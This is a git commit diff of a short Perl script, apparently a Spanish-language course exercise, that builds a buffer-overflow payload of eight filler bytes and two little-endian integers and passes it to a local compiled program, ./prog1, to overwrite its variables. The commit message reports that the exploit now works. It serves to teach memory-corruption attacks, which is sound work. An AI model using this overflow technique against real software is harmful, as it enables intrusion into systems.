7ce3220f6bc1b3b96abde4d64239eb01ae310645
Pepe Ortiz Roldán <99665744+madgIitch@users.noreply.github.com>
2023-06-19 18:27:14 -0400

    prog1 pl funciona ya!!!
    Voy a añadir el resto de outputs

--- proyect2/prog1.pl
+++ proyect2/prog1.pl
@@ -1,22 +1,17 @@
 #!/usr/bin/perl
 
+use strict;
+use warnings;
+
 # Valores específicos para val1 y val2
 my $val1 = 1818390343;
 my $val2 = 1917480553;
 
-# Convertir los valores a formato little endian
-my $val1_le = pack('L<', $val1);
-my $val2_le = pack('L<', $val2);
-
 # Construir el payload para el desbordamiento de búfer
-my $payload = pack('C*', (0) x 8);     # Rellena el buffer con 8 bytes nulos
-$payload .= $val1_le;                  # Agrega el valor de val1 en formato little endian
-$payload .= $val2_le;                  # Agrega el valor de val2 en formato little endian
-
-# Escapar caracteres especiales en el payload
-$payload = quotemeta($payload);
+my $payload = "A" x 8;                     # Rellena el buffer con 8 caracteres 'A'
+$payload .= pack('V', $val1);              # Agrega el valor de val1 en formato little endian
+$payload .= pack('V', $val2);              # Agrega el valor de val2 en formato little endian
 
 # Ejecutar el programa C con el payload como argumento
-my $programa = './prog1';        # Ruta al programa compilado
-my $comando = "$programa \"$payload\""; # Comando para ejecutar el programa con el payload
-system($comando);
+my $programa = './prog1';                  # Ruta al programa compilado
+system($programa, $payload);
